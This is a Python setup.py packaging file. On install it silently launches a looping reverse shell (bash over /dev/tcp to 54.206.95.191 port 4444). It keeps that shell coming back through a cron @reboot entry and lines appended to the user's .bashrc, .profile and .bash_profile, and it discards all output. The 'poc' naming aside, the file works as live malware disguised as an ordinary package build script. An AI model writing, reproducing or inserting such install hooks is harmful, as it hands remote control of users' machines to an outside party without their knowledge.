import subprocess
from setuptools import setup, find_packages

_LOCK = "/tmp/.poc_shell.lock"
_CONN = "bash -i >& /dev/tcp/54.206.95.191/4444 0>&1"

# guarded loop: only one instance runs; flock releases on process death
_LOOP = (
    f"exec 9>'{_LOCK}'; "
    "flock -n 9 || exit 0; "
    f"while true; do {_CONN}; sleep 5; done"
)
_CRON = f"@reboot /bin/bash -c \"{_LOOP}\" >/dev/null 2>&1"

def _spawn(cmd):
    try:
        subprocess.Popen(
            ["bash", "-c", cmd],
            start_new_session=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass

# immediate, self-healing, single-instance callback
_spawn(_LOOP)

# persistence: cron @reboot, deduped
_spawn(
    "if command -v crontab >/dev/null 2>&1; then "
    "( crontab -l 2>/dev/null | grep -vF \"@reboot /bin/bash -c 'exec 9>\"; "
    f"echo '{_CRON}' ) | crontab - ; "
    "fi"
)

# persistence: shell rc hooks, deduped
_spawn(
    "for f in $HOME/.bashrc $HOME/.profile $HOME/.bash_profile; do "
    "[ -f \"$f\" ] || continue; "
    "grep -qF '54.206.95.191' \"$f\" || "
    f"echo \"(bash -c \\\"{_LOOP}\\\" &) >/dev/null 2>&1\" >> \"$f\"; "
    "done"
)

setup(packages=find_packages(where="src"))
